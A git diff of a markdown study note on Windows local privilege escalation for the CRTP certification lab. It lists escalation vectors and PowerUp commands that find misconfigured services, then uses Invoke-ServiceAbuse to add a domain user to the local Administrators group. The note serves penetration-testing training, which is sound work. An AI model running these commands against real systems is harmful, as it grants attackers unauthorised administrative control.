@@ -1,24 +1,18 @@
 # Local Privilege Escalation
 
-
-
 {% hint style="info" %}
 The CRTP exam consists of 5 target servers in addition to a foothold student machine.\
 The goal is to OS level command execution on all 5 targets not matter what the privileges of the user.
 {% endhint %}
 
-####
-
 ## Vectors
 
-#### There are various ways of locally escalating privileges on Windows box:&#x20;
+#### There are various ways of locally escalating privileges on Windows box:
 
-* Missing patches – Automated deployment and AutoLogon passwords in clear text&#x20;
-* &#x20;AlwaysInstallElevated (Any user can run MSI as SYSTEM)&#x20;
-* &#x20;Misconfigured Services – DLL Hijacking and more&#x20;
+* Missing patches – Automated deployment and AutoLogon passwords in clear text
+* AlwaysInstallElevated (Any user can run MSI as SYSTEM)
+* Misconfigured Services – DLL Hijacking and more
 * NTLM Relaying a.k.a. Won't Fix
-
-
 
 This guide offer a sufficiently comprehensive overview of the course material for local privilege escalation
 
@@ -59,7 +53,7 @@ Find vulnerable service configuration
 
 ```powershell
 # Get services with unquoted paths and spaces
-Get-ServiceUnquoted -Verbose
+Get-UnquotedService -Verbose
 
 # Get services where current user can write to binary path
 Get-ModifiableServiceFile -Verbose
@@ -71,7 +65,9 @@ Get-ModifiableService -Verbose
 Add domain user to the local Administrators group
 
 ```powershell
-Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+# Verify if the above command worked or not with
+net localgroup administrators  
 ```
 {% endtab %}
 {% endtabs %}
